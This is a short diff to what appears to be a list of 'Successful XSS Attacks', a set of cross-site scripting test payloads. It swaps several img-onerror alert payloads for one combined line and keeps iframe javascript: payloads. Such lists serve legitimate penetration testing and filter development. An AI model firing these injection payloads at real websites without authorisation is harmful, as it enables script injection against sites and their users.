@@ -1,6 +1,4 @@
 Successful XSS Attacks
-:<img src=x onerror=alert('XSS')>
-"><img src=x onerror=alert('XSS')>
-'><img src=x onerror=alert('XSS')>
+:'><img src=x onerror=alert('XSS')>
 <iframe src="javascript:alert('XSS')"></iframe>
 "><iframe src="javascript:alert('XSS')"></iframe>
